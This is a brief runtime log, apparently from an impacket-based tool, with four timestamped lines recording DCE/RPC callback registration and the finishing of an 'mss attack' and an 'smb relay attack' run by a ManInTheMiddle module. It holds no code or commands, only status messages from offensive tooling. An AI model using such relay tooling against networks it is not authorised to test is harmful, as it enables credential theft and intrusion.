2021-11-10 18:04:03.349 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-10 18:04:03.350 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-10 18:04:04.683 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:54 - Finishing mss attack in the background ...
2021-11-12 12:49:16.370 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
